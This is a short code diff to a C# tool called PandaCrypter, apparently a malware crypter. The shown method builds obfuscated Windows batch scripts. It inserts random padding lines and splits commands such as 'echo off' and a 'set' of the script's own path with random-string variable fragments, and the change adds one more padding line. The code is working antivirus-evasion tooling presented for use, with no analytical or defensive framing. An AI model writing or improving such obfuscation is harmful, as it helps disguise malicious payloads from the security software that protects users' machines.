@@ -429,6 +429,7 @@ namespace PandaCrypter
             string RandomSetVarName = Utils.RandomString(11, rng);
             finalBat.AppendLine(BatchPadding(rng));
             finalBat.AppendLine(@"%!%@%!%E^%!%C^%!%h^%!%o%!% %!%o%!%f%!%f%!%".Replace(@"!", Utils.RandomString(20, rng)));
+			finalBat.AppendLine(BatchPadding(rng));
 			finalBat.AppendLine(@"%!%s%!%e%!%t%!% %!%M%!%Y%!%_%!%B%!%A%!%T%!%_%!%P%!%A%!%T%!%H%!%=%~dpnx0".Replace(@"!", Utils.RandomString(20, rng)));
             if (runAsAdmin)
             {
